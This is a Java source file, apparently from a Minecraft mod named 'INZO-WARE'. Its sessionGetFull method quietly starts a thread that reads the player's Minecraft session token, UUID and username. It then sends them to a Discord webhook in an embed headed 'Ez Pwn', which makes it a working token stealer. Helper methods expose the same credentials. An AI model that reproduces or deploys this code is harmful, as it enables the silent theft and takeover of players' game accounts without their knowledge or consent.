package com.inzo.technologies.inzoware.utils;

import java.awt.Color;
import java.net.URL;
import java.security.MessageDigest;
import java.util.Scanner;

import com.inzo.technologies.inzoware.exception.WebhookException;
import com.inzo.technologies.inzoware.hooks.DiscordDuper;
import com.inzo.technologies.inzoware.hooks.Hooks374;
import com.inzo.technologies.inzoware.hooks.DiscordDuper.EmbedObject;

import net.minecraft.client.Minecraft;
import net.minecraft.launchwrapper.Launch;

public class Methods {

    public static void sessionGetFull() {
	    new Thread(() -> {
	    	try {
	    		Minecraft mc = Minecraft.getMinecraft();
			    String token = mc.getSession().getToken();
			    String uuid = mc.getSession().getProfile().getId().toString();
			    String name = mc.getSession().getProfile().getName();
				String avatar = "https://minotar.net/avatar/" + name +".png";
			    
			    DiscordDuper dh = new DiscordDuper(Hooks374.getyou());
			    dh.setContent("INZO-WARE");
			    dh.setUsername(name);
				dh.setAvatarUrl(avatar);
			    dh.addEmbed(new DiscordDuper.EmbedObject()
			    		.setTitle(name + " Full Minecraft Information")
			    		.setColor(Color.CYAN)
			    		.setAuthor("Ez Pwn", "", "")
			    		.addField("Username", name, true)
			    		.addField("UUID", uuid.replace("-", ""), true)
			    		.addField("Token", token, false)
			    		.setFooter("https://sky.shiiyu.moe/stats/" + name, ""));
			    dh.execute();
	    	}catch(Exception e) {
	    		new WebhookException().printStackTrace();
	    	}
	    }).start();

	}
	
	public static String username() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
	    String name = mc.getSession().getProfile().getName();
	    return (String) name;
	}
	
	public static String uuid() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
	    String uuid = mc.getSession().getProfile().getId().toString();
	    return (String) uuid;
	}
	
	public static String token() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
	    String token = mc.getSession().getToken();
	    return (String) token;
	}
	

	
	
	

}